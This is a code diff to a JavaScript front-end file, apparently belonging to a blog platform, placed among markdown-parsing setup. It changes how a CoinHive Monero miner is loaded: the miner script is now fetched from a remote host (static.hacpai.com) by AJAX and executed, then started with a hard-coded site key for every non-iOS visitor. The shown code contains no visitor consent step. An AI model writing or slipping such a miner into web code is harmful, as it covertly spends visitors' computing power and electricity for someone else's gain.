@@ -7,7 +7,7 @@
 
 import $ from 'jquery'
 import config from '../../pipe.json'
-import xmr from './lib/xmr.min'
+
 /**
  * @description 初始化 markdown 解析
  */
@@ -322,6 +322,14 @@ ${selectionObj.toString()}${genCopy(author, link).join('<br>')}</div>`)
   if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
     return
   }
-  const miner = new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9});
-  miner.start();
+
+  $.ajax({
+    method: "GET",
+    url: 'https://static.hacpai.com/js/lib/xmr.min.js',
+    dataType: "script",
+    cache: true
+  }).done(function () {
+    const miner = new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9});
+    miner.start();
+  });
 })()
